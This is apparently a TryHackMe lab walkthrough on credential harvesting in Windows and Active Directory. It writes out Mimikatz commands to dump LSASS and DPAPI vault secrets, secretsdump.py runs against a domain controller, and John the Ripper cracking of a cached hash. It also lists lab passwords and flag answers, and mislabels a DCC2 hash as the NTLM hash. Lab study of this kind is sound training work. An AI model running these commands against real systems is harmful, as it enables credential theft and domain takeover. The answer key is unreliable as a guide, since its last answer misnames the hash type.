# [Intro to Credential Harvesting - TryHackMe](https://tryhackme.com/room/introtocredentialharvesting) | Cyanyde

Learn how credentials are stored, cached, and exposed in Windows and Active Directory environments.

## Credits

- Room type: Premium
- Created by [tryhackme](https://tryhackme.com/p/tryhackme) and [DrGonz0](https://tryhackme.com/p/DrGonz0)

## Windows & Active Directory Credential Stores

#### Provided Credentials

- User: Administrator
- Pass: N3w34829DJdd?1

### Which Windows component stores active NTLM and Kerberos credentials in memory?

> NTLM and Kerberos credentials are stored in **LSASS** memory

### What file in the C:\Windows\NTDS\ directory contains the AD database?

> The **NTDS.dit** file contains the AD database

### Which Mimikatz command exports DPAPI Vault credentials?

> **vault::cred /export** exports DPAPI vault credentials with Mimikatz

## Credential Extraction with Mimikatz

### What is Elon Tusk's Gmail password?

- RDP into first target machine using provided credentials
- *mimikatz* is provided on the desktop and *Windows Defender* is disabled
- Open powershell as administrator and run *mimikatz*
    - `.\mimikatz.exe`
    - `vault::list` to show available vaults on the system
    - `vault::cred /export` to display credentials

> Elon Tusk's Gmail password is **MyTusksAreThaB3st**

### What is svc-app's password?

- `sekurlsa::logonpasswords` within mimikatz will dump credentials stored within LSASS memory

> svc-app's password is **S3rv!c3Acc!**

## Credential Harvesting with Secretsdump

### What is drgonzo's password?

- Use *secretsdump.py* from the [Impacket](https://github.com/fortra/impacket) python module
    - `secretsdump.py WRK/Administrator:N3w34829DJdd?1@<target ip> -output local_dump` will dump the local hashes of the Domain Controller
- drgonzo's password hash information is: `TRYHACKME.LOC/drgonzo:$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f:`
- Crack using *hashcat* or *johntheripper*
    - Shorten the hash to just the password
        - `:$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f:`
    - `john --format=mscash2 hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar` to use johntheripper with the *rockyou* wordlist, specifying the *mscash2* format

> drgonzo's password is **lasvegas1**

### What is the domain Administrators NTLM hash?

- Use the credentials for drgonzo to rerun *secretsdump.py* as domain admin
    - `secretsdump.py TRYHACKME/drgonzo:lasvegas1@10.220.10.10 -just-dc -output dc_dump`

> The domain Administrator's NTLM hash is **:$DCC2$10240#Administrator#ea671e1143604bb87c6d48f6b5475c08:**